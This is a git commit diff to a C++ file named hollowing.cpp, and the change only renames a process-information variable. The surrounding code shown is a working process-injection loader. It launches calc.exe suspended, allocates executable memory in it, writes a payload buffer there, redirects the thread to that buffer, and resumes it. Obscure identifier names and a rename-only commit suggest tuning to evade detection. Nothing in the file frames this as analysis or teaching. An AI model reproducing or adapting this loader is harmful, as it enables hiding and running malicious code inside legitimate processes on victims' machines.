1c46606189245a14a1462fd44cf8513a0624c1a9
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-29 00:26:52 -0500

    Update hollowing.cpp

--- dummyda/hollowing.cpp
+++ dummyda/hollowing.cpp
@@ -36,33 +36,33 @@ int main() {
 
     // Create a new process in a suspended state
     STARTUPINFO si = {0};
-    PROCESS_INFORMATION pi = {0};
+    PROCESS_INFORMATION procin = {0};
     si.cb = sizeof(si);
 
-    CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &procin);
       
 
     
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
 
-    GetThreadContext(pi.hThread, &ctx);
+    GetThreadContext(procin.hThread, &ctx);
 
-    LPVOID dankummm = VirtualAllocEx(pi.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID dankummm = VirtualAllocEx(procin.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
 
     // Write payload to target process
-    WriteProcessMemory(pi.hProcess, dankummm, codfhu, codfhuLen, NULL);
+    WriteProcessMemory(procin.hProcess, dankummm, codfhu, codfhuLen, NULL);
     // Update entry point
     ctx.Rcx = (DWORD64)dankummm; // Use Rcx for x64 processes
-    SetThreadContext(pi.hThread, &ctx);
+    SetThreadContext(procin.hThread, &ctx);
 
     // Resume thread to execute payload
-    ResumeThread(pi.hThread); 
+    ResumeThread(procin.hThread); 
 
     
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    CloseHandle(procin.hThread);
+    CloseHandle(procin.hProcess);
 
     return 0;
 }
